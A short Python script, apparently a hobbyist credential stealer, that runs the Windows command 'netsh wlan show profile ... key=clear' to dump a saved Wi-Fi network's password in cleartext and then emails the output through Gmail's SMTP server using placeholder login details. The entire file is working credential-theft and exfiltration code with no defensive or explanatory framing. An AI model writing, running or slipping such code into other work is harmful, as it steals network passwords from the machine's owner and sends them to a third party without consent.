import subprocess
import smtplib

def send_mail(email, password, message):
    """This function sends the email"""
    server = smtplib.SMTP("smtp.gmail.com", 587) # create an SMTP object
    server.starttls() # start TLS
    server.login(email, password) # login to the email
    server.sendmail(email, email, message) # send the email
    server.quit() # quit the server

command = "netsh wlan show profile UPC723969 key=clear" # create a command
result = subprocess.check_output(command, shell=True) # execute the command
send_mail("email", "password", result) # send the result